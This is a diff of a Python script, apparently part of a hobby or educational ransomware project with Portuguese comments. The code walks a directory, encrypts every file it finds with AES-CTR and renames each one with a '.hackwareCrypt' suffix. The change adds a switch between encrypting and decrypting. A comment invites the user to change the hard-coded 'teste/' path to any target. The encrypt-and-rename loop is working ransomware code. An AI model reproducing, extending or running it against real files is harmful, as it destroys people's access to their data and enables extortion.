@@ -50,13 +50,19 @@ def main():
     ctr = Counter.new(128)
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
 
+    # Modo de operação do encriptador / decriptador
+    if not decrypt:
+        cryptFn = crypt.encrypt
+    else:
+        cryptFn = crypt.decrypt
+
     # altere isto para a sua necessidade
     init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste/'))
     startdirs = [init_path]
 
     for currentDir in startdirs:
         for filename in discovery.discover(currentDir):
-            Crypter.change_files(filename, crypt.encrypt)
+            Crypter.change_files(filename, cryptFn)
             # Renomeia o arquivo pra indicar a encriptação
             os.rename(filename, filename+'.hackwareCrypt')
 
